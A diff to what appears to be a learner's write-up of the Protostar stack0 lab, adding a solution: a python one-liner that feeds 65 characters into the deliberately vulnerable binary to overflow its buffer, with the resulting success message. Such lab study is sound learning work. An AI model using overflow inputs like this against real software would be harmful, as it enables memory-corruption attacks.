@@ -2,6 +2,7 @@
 https://exploit-exercises.com/protostar/stack0/ 
 
 # Solution
-
+user@protostar:/opt/protostar/bin$ python -c 'print "a"*65' | ./stack0
+you have changed the 'modified' variable 
 
 # What I learned
